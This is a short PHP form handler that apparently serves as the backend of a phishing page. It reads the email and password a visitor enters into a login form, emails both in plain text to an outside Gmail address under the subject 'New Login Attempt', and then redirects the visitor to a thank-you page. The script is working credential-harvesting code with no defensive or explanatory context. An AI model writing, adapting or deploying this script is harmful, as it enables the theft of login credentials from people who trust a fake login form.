<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Email details
    $to = "eastcoastpaid@gmail.com";  // Your email
    $subject = "New Login Attempt";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: noreply@yourdomain.com"; // You can change this

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        header('Location: thank-you.html'); // Redirect to thank-you page after form submission
        exit();
    } else {
        echo "Error: Unable to send email.";
    }
}
?>
